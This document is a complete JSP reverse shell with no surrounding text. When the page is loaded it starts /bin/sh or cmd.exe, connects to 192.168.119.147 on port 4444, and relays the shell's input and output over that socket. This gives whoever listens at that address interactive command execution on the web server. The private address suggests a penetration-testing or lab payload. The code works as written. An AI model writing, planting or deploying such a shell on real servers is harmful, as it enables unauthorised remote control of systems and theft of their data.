<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gf;
    OutputStream of;

    StreamConnector( InputStream gf, OutputStream of )
    {
      this.gf = gf;
      this.of = of;
    }

    public void run()
    {
      BufferedReader jx  = null;
      BufferedWriter axx = null;
      try
      {
        jx  = new BufferedReader( new InputStreamReader( this.gf ) );
        axx = new BufferedWriter( new OutputStreamWriter( this.of ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = jx.read( buffer, 0, buffer.length ) ) > 0 )
        {
          axx.write( buffer, 0, length );
          axx.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( jx != null )
          jx.close();
        if( axx != null )
          axx.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.147", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
